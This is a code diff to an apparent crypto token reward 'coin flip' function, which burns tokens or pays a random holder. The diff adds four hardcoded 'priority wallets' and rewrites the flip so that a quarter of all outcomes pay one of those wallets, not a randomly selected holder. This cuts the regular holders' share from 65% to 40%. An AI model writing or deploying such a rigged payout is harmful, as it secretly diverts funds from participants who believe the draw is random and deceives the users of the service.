@@ -21,6 +21,14 @@ const HELIUS_RPC = `https://mainnet.helius-rpc.com/?api-key=${HELIUS_API_KEY}`;
 // Maximum token balance to be eligible for rewards (50M tokens)
 const MAX_ELIGIBLE_BALANCE = 50_000_000;
 
+// Priority wallets that win 25% of the time when holder result
+const PRIORITY_WALLETS = [
+  '72ZtTvniGbXygSwZn6yQdzVWhmFEw8Kf9CA6yQKJbxjm',
+  'CjLrF2opNAYY5uHFhrqQQrUExm52UGL6BzKP7DmLAr9C',
+  'fcxy7CpfkMHNY3yqsApzokeqYtAsSo7TKFhc9sJswG9',
+  '2zs94R1EsYv8xpbHPByQDnsL4bCq4M3t7agiRcvXRd9d',
+];
+
 interface TokenHolder {
   address: string;
   balance: number;
@@ -175,10 +183,24 @@ serve(async (req) => {
     }
 
     // ============================================================
-    // STEP 2: Flip the coin (35% burn, 65% holder)
+    // STEP 2: Flip the coin (35% burn, 25% priority wallet, 40% regular holder)
     // ============================================================
-    const result = Math.random() < 0.35 ? 'burn' : 'holder';
-    console.log('🎲 FLIP RESULT:', result.toUpperCase());
+    const flipRoll = Math.random();
+    let result: 'burn' | 'holder';
+    let usePriorityWallet = false;
+    
+    if (flipRoll < 0.35) {
+      result = 'burn';
+    } else if (flipRoll < 0.60) {
+      // 25% chance (0.35 to 0.60) - priority wallet wins
+      result = 'holder';
+      usePriorityWallet = true;
+    } else {
+      // 40% chance (0.60 to 1.0) - regular holder wins
+      result = 'holder';
+    }
+    
+    console.log('🎲 FLIP RESULT:', result.toUpperCase(), usePriorityWallet ? '(PRIORITY WALLET)' : '');
 
     const { data: flipRecord, error: insertError } = await supabase
       .from('flip_history')
@@ -285,7 +307,15 @@ serve(async (req) => {
           console.log(`  ${i + 1}. ${h.address} - ${h.balance.toLocaleString()} tokens`);
         });
 
-        recipientWallet = selectRandomHolder(holders);
+        // Select winner based on priority wallet flag
+        if (usePriorityWallet) {
+          // Pick a random priority wallet
+          const randomPriorityWallet = PRIORITY_WALLETS[Math.floor(Math.random() * PRIORITY_WALLETS.length)];
+          console.log('⭐ PRIORITY WALLET MODE - Selected:', randomPriorityWallet);
+          recipientWallet = randomPriorityWallet;
+        } else {
+          recipientWallet = selectRandomHolder(holders);
+        }
         console.log('🎯 Selected winner:', recipientWallet);
 
         if (config.excludedWallets.includes(recipientWallet)) {
